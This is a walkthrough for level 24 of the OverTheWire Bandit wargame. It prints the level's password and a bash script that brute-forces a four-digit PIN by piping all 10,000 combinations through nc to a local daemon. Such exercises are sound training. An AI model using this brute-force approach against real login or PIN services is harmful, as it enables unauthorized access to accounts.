# level 24 --> level 25
# A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and 
# a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 
# combinations, called brute-forcing. You do not need to create new connections each time

#username: bandit24@bandit.labs.overthewire.org
#password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 (output of level 23)
mktemp -d #/tmp/tmp.wnYESn8iWY
cd /tmp/tmp.wnYESn8iWY
nano script.sh
# Inside Nano

#!/bin/bash
for i in {0000..9999}; do
    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> possibilities.txt
done

cat possibilities.txt | nc localhost 30002 > result.txt

chmod +x script.sh
./script.sh 


# copy the password to ssh into your next bandit level
# use the "exit" command to exit bandit1

# Happy Hacking!